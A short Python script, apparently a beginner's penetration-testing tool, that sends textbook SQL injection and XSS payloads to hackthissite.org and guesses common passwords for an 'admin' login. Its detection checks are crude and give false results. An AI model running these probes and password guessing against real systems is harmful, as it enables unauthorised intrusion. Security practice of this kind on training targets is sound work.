import requests
from bs4 import BeautifulSoup

#test SQL Injection
def test_sql_injection(url, payloads):
    vulnerable = False
    for payload in payloads:
        response = requests.get(url + payload)
        if "error" in response.text.lower() or "sql" in response.text.lower():
            print(f"SQL Injection vulnerability found with payload: {payload}")
            vulnerable = True
    return vulnerable

#test XSS
def test_xss(url, payloads):
    vulnerable = False
    for payload in payloads:
        response = requests.get(url + payload)
        if payload.strip('<>') in response.text:
            print(f"XSS vulnerability found with payload: {payload}")
            vulnerable = True
    return vulnerable

#test insecure authentication
def test_insecure_auth(url, username, common_passwords):
    vulnerable = False
    for password in common_passwords:
        response = requests.post(url, data={'username': username, 'password': password})
        if "welcome" in response.text.lower():
            print(f"Insecure authentication vulnerability found with password: {password}")
            vulnerable = True
            break
    return vulnerable


def penetration_test(base_url):
    sql_payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "' OR 1=1 -- "]
    xss_payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
    common_passwords = ["password", "123456", "admin"]

    #SQL Injection
    print("Testing SQL Injection...")
    if not test_sql_injection(base_url, sql_payloads):
        print("No SQL Injection vulnerabilities found.")

    #XSS
    print("Testing XSS...")
    if not test_xss(base_url, xss_payloads):
        print("No XSS vulnerabilities found.")

    #Insecure Authentication
    print("Testing Insecure Authentication...")
    login_url = base_url + "/login"  
    if not test_insecure_auth(login_url, "admin", common_passwords):
        print("No Insecure Authentication vulnerabilities found.")


if __name__ == "__main__":
    target_url = "https://www.hackthissite.org/" 
    penetration_test(target_url)
